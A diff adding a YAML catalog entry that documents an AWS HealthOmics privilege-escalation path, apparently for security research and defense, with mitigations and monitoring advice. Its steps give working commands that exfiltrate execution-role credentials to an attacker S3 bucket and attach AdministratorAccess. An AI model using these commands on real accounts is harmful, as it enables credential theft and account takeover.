@@ -1,0 +1,328 @@
+id: omics-001
+name: iam:PassRole + omics:CreateWorkflow + omics:StartRun
+category: new-passrole
+services:
+  - iam
+  - omics
+  - s3
+
+permissions:
+  required:
+    - permission: iam:PassRole
+      resourceConstraints: Must be able to pass the target admin IAM execution role to the HealthOmics service
+    - permission: omics:CreateWorkflow
+      resourceConstraints: No resource constraints required
+    - permission: omics:StartRun
+      resourceConstraints: No resource constraints required
+    - permission: s3:GetObject
+      resourceConstraints: Must be able to read the exfiltrated credentials from the attacker-controlled S3 bucket after the workflow completes
+  additional:
+    - permission: omics:GetWorkflow
+      resourceConstraints: Useful for polling workflow creation status
+    - permission: omics:GetRun
+      resourceConstraints: Useful for monitoring run status and confirming execution
+    - permission: omics:ListRuns
+      resourceConstraints: Helpful for discovering existing runs
+    - permission: iam:ListAttachedUserPolicies
+      resourceConstraints: Useful for verifying privilege escalation success
+
+description: A principal with `iam:PassRole`, `omics:CreateWorkflow`, and `omics:StartRun` can escalate privileges by creating an AWS HealthOmics WDL workflow containing a task that exfiltrates the execution role's temporary credentials to an attacker-controlled S3 bucket. The attacker starts a run passing an admin execution role, waits for the workflow to complete, retrieves the exfiltrated credentials from S3, and uses them to directly call `iam:AttachUserPolicy` to attach AdministratorAccess to the starting user. Note that HealthOmics workflow tasks have network isolation from the public internet but do have access to S3, making credential exfiltration via S3 the standard technique.
+
+prerequisites:
+  admin:
+    - A role must exist that trusts omics.amazonaws.com to assume it
+    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+    - An attacker-controlled S3 bucket must be accessible from the HealthOmics task execution environment (the execution role must have s3:PutObject on the bucket)
+    - A private ECR repository must contain a container image suitable for running AWS CLI commands (HealthOmics requires private ECR images, not public Docker Hub images)
+  lateral:
+    - A role must exist that trusts omics.amazonaws.com and has elevated permissions
+    - An attacker-controlled S3 bucket must be accessible from the HealthOmics execution environment
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        cat > /tmp/exploit.wdl << 'EOF'
+        version 1.0
+        workflow ExfilWorkflow {
+          input {
+            String s3_bucket
+            String s3_key
+          }
+          call ExfilTask {
+            input: s3_bucket = s3_bucket, s3_key = s3_key
+          }
+        }
+
+        task ExfilTask {
+          input {
+            String s3_bucket
+            String s3_key
+          }
+          command <<<
+            # HealthOmics injects credentials via the container credential provider
+            curl -s http://169.254.170.23/v1/credentials > /tmp/creds.json
+            aws s3 cp /tmp/creds.json "s3://~{s3_bucket}/~{s3_key}"
+          >>>
+          runtime {
+            docker: "ACCOUNT_ID.dkr.ecr.REGION.amazonaws.com/aws-cli:latest"
+            memory: "4 GB"
+            cpu: 1
+          }
+        }
+        EOF
+
+        zip /tmp/workflow.zip /tmp/exploit.wdl
+        aws s3 cp /tmp/workflow.zip s3://WORKFLOW_BUCKET/workflow.zip
+      description: Create a WDL workflow definition that exfiltrates execution role credentials to S3 using the HealthOmics container credential provider endpoint. HealthOmics tasks cannot reach the public internet but do have S3 access.
+    - step: 2
+      command: |
+        aws omics create-workflow \
+          --name privesc-workflow \
+          --definition-zip fileb:///tmp/workflow.zip \
+          --engine WDL \
+          --parameter-template '{
+            "s3_bucket": {"description": "S3 bucket for credential exfiltration"},
+            "s3_key": {"description": "S3 key for credential output"}
+          }'
+      description: Create the HealthOmics workflow from the WDL definition zip file.
+    - step: 3
+      command: |
+        aws omics start-run \
+          --workflow-id WORKFLOW_ID \
+          --role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
+          --name privesc-run \
+          --parameters '{
+            "s3_bucket": "ATTACKER_BUCKET",
+            "s3_key": "exfil/creds.json"
+          }' \
+          --output-uri s3://WORKFLOW_BUCKET/output/ \
+          --storage-capacity 100
+      description: Start the workflow run, passing the admin execution role via iam:PassRole. HealthOmics provisions the container and runs the WDL task, which exfiltrates the execution role's credentials to the attacker S3 bucket.
+    - step: 4
+      command: |
+        aws omics get-run \
+          --id RUN_ID \
+          --query 'status' \
+          --output text
+      description: Poll run status until COMPLETED, then retrieve the exfiltrated credentials from S3.
+    - step: 5
+      command: |
+        aws s3 cp s3://ATTACKER_BUCKET/exfil/creds.json /tmp/admin-creds.json
+
+        AWS_ACCESS_KEY_ID=$(jq -r '.AccessKeyId' /tmp/admin-creds.json) \
+        AWS_SECRET_ACCESS_KEY=$(jq -r '.SecretAccessKey' /tmp/admin-creds.json) \
+        AWS_SESSION_TOKEN=$(jq -r '.Token' /tmp/admin-creds.json) \
+        aws iam attach-user-policy \
+          --user-name STARTING_USER \
+          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+      description: Retrieve the exfiltrated execution role credentials from S3 and use them directly to call iam:AttachUserPolicy, attaching AdministratorAccess to the starting user.
+
+recommendation: |
+  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid administrative HealthOmics execution roles** - Genomics workflow tasks rarely need administrative IAM access. Scope execution roles to only the S3 buckets, ECR repositories, and reference stores the workflow legitimately requires.
+  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services. Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificOmicsRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "omics.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  - **Control S3 bucket access from HealthOmics execution roles** - The credential exfiltration technique depends on the execution role having `s3:PutObject` on an attacker-controlled bucket. Restrict execution role S3 access to specific known-good bucket ARNs.
+  - Monitor CloudTrail for unusual HealthOmics workflow creation followed by run starts with privileged roles
+  - Monitor CloudTrail for HealthOmics runs by principals who do not usually start genomics workflows
+  - Monitor CloudTrail for roles being passed to HealthOmics that haven't been used before
+  - Alert on S3 PutObject events originating from HealthOmics task execution roles to unexpected bucket destinations
+  - Regularly audit all IAM roles that trust omics.amazonaws.com and down-scope any with administrative access
+
+limitations: |
+  This path uses credential exfiltration via S3 rather than direct IAM API calls from within the task, because HealthOmics workflow tasks have network isolation that prevents direct internet or IAM API access. The execution role must have s3:PutObject permission on the attacker-controlled bucket. The attacker must also have an available private ECR container image, as HealthOmics does not support public Docker Hub images. HealthOmics runs typically take 15+ minutes to complete.
+
+discoveryAttribution:
+  firstDocumented:
+    author: Seth Art
+    organization: Datadog
+    date: "2025"
+
+references:
+  - title: "Actions defined by AWS HealthOmics - Service Authorization Reference"
+    url: "https://docs.aws.amazon.com/service-authorization/latest/reference/list_awshealthomics.html"
+  - title: "IAM roles and policies for AWS HealthOmics - AWS HealthOmics"
+    url: "https://docs.aws.amazon.com/omics/latest/dev/security-iam-roles.html"
+
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: "privesc-one-hop/to-admin/omics-001-iam-passrole+omics-createworkflow+omics-startrun"
+    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
+
+attackVisualization:
+  nodes:
+    - id: start
+      label: Starting Principal
+      type: principal
+      description: The principal with `iam:PassRole`, `omics:CreateWorkflow`, `omics:StartRun`, and `s3:GetObject` permissions. Can be an IAM user or role. The `s3:GetObject` permission is needed to retrieve the exfiltrated credentials from the attacker-controlled S3 bucket after the workflow run completes.
+
+    - id: workflow
+      label: HealthOmics WDL Workflow
+      type: resource
+      description: |
+        A new AWS HealthOmics workflow created by the attacker using a WDL definition. The WDL task definition contains a command block that queries the HealthOmics container credential provider endpoint and exfiltrates the execution role's temporary credentials to an attacker-controlled S3 bucket.
+
+        Command:
+        ```bash
+        aws omics create-workflow \
+          --name privesc-workflow \
+          --definition-zip fileb:///tmp/workflow.zip \
+          --engine WDL \
+          --parameter-template '{"s3_bucket":{"description":"S3 bucket for credential exfiltration"},"s3_key":{"description":"S3 key for credential output"}}'
+        ```
+
+        The WDL task uses `curl http://169.254.170.23/v1/credentials` to retrieve credentials from the HealthOmics container credential provider, then uploads them via `aws s3 cp`. HealthOmics tasks have network isolation from the public internet but retain S3 access.
+
+    - id: exec_role
+      label: Admin Execution Role
+      type: principal
+      description: The IAM role passed to the HealthOmics workflow run. The role must trust `omics.amazonaws.com` and have the permissions needed to run the workflow (including `s3:PutObject` on the attacker-controlled bucket). The role's temporary credentials are injected into the task container via the HealthOmics container credential provider at `http://169.254.170.23/v1/credentials`.
+
+    - id: task_container
+      label: WDL Task Container
+      type: payload
+      color: '#99ccff'
+      description: |
+        The WDL task container that executes the credential exfiltration. HealthOmics provisions the container from a private ECR repository (public Docker Hub images are not supported). The container runs the WDL command block using the execution role's credentials, which are available via the HealthOmics container credential provider endpoint.
+
+        WDL task command block:
+        ```bash
+        # HealthOmics injects credentials via the container credential provider
+        curl -s http://169.254.170.23/v1/credentials > /tmp/creds.json
+        aws s3 cp /tmp/creds.json "s3://ATTACKER_BUCKET/exfil/creds.json"
+        ```
+
+        The task container cannot reach the public internet directly, so credential exfiltration via S3 is the standard technique. Runs typically take 15+ minutes to complete.
+
+    - id: attacker_s3
+      label: Attacker S3 Bucket
+      type: resource
+      description: |
+        The attacker-controlled S3 bucket used as the exfiltration destination. The WDL task container writes the execution role's temporary credentials (AccessKeyId, SecretAccessKey, SessionToken) to this bucket using `s3:PutObject`. After the run completes, the starting principal reads the credentials using `s3:GetObject` and uses them to call `iam:AttachUserPolicy`.
+
+        Retrieve exfiltrated credentials:
+        ```bash
+        aws s3 cp s3://ATTACKER_BUCKET/exfil/creds.json /tmp/admin-creds.json
+
+        AWS_ACCESS_KEY_ID=$(jq -r '.AccessKeyId' /tmp/admin-creds.json) \
+        AWS_SECRET_ACCESS_KEY=$(jq -r '.SecretAccessKey' /tmp/admin-creds.json) \
+        AWS_SESSION_TOKEN=$(jq -r '.Token' /tmp/admin-creds.json) \
+        aws iam attach-user-policy \
+          --user-name STARTING_USER \
+          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+        ```
+
+    - id: admin
+      label: Effective Administrator (via exfiltrated creds)
+      type: outcome
+      description: The HealthOmics execution role has AdministratorAccess or equivalent permissions. The starting principal retrieves the exfiltrated credentials from S3 and uses them to call `iam:AttachUserPolicy`, gaining full administrative access to the AWS account.
+
+    - id: some_perms
+      label: Some additional access
+      type: outcome
+      color: '#ffeb99'
+      description: The execution role has some elevated permissions but not full admin access. The starting principal can use the exfiltrated credentials for data access (S3, RDS, DynamoDB), security configuration changes, or additional privilege escalation paths.
+
+    - id: no_access
+      label: No additional access
+      type: outcome
+      color: '#cccccc'
+      description: The execution role only has minimal permissions scoped to HealthOmics operations (e.g., specific S3 buckets or ECR repositories). The exfiltrated credentials provide limited value for further privilege escalation.
+
+  edges:
+    - from: start
+      to: workflow
+      label: iam:PassRole + omics:CreateWorkflow + omics:StartRun
+      description: |
+        Create a HealthOmics WDL workflow containing a credential exfiltration task, then start a run passing the admin execution role. The workflow definition is uploaded as a zip file containing the WDL definition.
+
+        Step 1 — Create workflow:
+        ```bash
+        aws omics create-workflow \
+          --name privesc-workflow \
+          --definition-zip fileb:///tmp/workflow.zip \
+          --engine WDL \
+          --parameter-template '{"s3_bucket":{"description":"S3 bucket"},"s3_key":{"description":"S3 key"}}'
+        ```
+
+        Step 2 — Start run with PassRole:
+        ```bash
+        aws omics start-run \
+          --workflow-id WORKFLOW_ID \
+          --role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
+          --name privesc-run \
+          --parameters '{"s3_bucket":"ATTACKER_BUCKET","s3_key":"exfil/creds.json"}' \
+          --output-uri s3://WORKFLOW_BUCKET/output/ \
+          --storage-capacity 100
+        ```
+
+    - from: workflow
+      to: exec_role
+      label: Run assumes execution role
+      description: When the HealthOmics run starts, the service assumes the execution role passed via `iam:PassRole`. The role's temporary credentials are injected into the task container via the HealthOmics container credential provider at `http://169.254.170.23/v1/credentials`, making them accessible to commands running inside the container.
+
+    - from: exec_role
+      to: task_container
+      label: Task runs with execution role credentials
+      description: HealthOmics provisions a container from the private ECR image specified in the WDL runtime block. The container executes the WDL command block using the execution role's credentials. The credential provider endpoint at `http://169.254.170.23/v1/credentials` returns the execution role's AccessKeyId, SecretAccessKey, and SessionToken.
+
+    - from: task_container
+      to: attacker_s3
+      label: Credentials exfiltrated to S3 (s3:PutObject)
+      description: The WDL task container uploads the execution role's temporary credentials to the attacker-controlled S3 bucket. HealthOmics tasks cannot reach the public internet directly, so S3 is the exfiltration channel. The execution role must have `s3:PutObject` permission on the attacker's bucket for this step to succeed.
+
+    - from: start
+      to: attacker_s3
+      label: s3:GetObject (retrieve exfiltrated creds)
+      description: |
+        After the HealthOmics run completes (typically 15+ minutes), the starting principal reads the exfiltrated credentials from the S3 bucket and uses them to escalate privileges.
+
+        Command:
+        ```bash
+        aws s3 cp s3://ATTACKER_BUCKET/exfil/creds.json /tmp/admin-creds.json
+
+        AWS_ACCESS_KEY_ID=$(jq -r '.AccessKeyId' /tmp/admin-creds.json) \
+        AWS_SECRET_ACCESS_KEY=$(jq -r '.SecretAccessKey' /tmp/admin-creds.json) \
+        AWS_SESSION_TOKEN=$(jq -r '.Token' /tmp/admin-creds.json) \
+        aws iam attach-user-policy \
+          --user-name STARTING_USER \
+          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+        ```
+
+    - from: attacker_s3
+      to: admin
+      label: If execution role has admin permissions
+      branch: A
+      condition: admin
+      description: If the HealthOmics execution role has AdministratorAccess or IAM write permissions, the starting principal uses the exfiltrated credentials to call `iam:AttachUserPolicy`, gaining full administrative access to the AWS account.
+
+    - from: attacker_s3
+      to: some_perms
+      label: If execution role has some elevated permissions
+      branch: B
+      condition: some_permissions
+      description: If the execution role has elevated permissions but not full admin access, the starting principal can use the exfiltrated credentials for data exfiltration, security configuration changes, or additional privilege escalation paths.
+
+    - from: attacker_s3
+      to: no_access
+      label: If execution role has minimal permissions
+      branch: C
+      condition: no_permissions
+      description: If the execution role only has minimal permissions scoped to HealthOmics operations, the exfiltrated credentials provide limited value for further privilege escalation.
